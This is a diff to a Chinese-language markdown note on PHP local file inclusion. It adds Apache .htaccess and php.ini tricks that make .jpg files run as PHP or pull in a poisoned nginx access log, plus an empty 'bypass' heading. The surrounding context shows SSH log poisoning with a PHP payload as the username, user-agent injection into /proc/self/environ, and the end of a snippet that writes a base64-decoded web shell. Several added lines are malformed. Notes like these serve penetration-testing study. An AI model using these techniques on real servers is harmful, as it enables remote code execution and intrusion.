@@ -94,6 +94,16 @@ SSH log实际上的利用原理和访问日志是一致的，`/var/log/auth.log`
 ```shell
 ssh '<?php phpinfo();?>'@remotehost
 ```
+
+## Apache
+### .htacess
+`AddType application/x-httpd-php .jpg [`
+
+### .ini
+在所有页面的顶部与底部都加入require语句
+
+`auto_prepend_file`与`auto_append_file
+`auto_append_file="/var/log/nginx/access.log"`
 ## 包含environ
 /proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。
 **利用条件**
@@ -184,6 +194,9 @@ fwrite($shellfile,base64_decode($a));
 fclose($shellfile);
 ?>
 ```
+
+# bypass
+
 
 
 # 参考文章
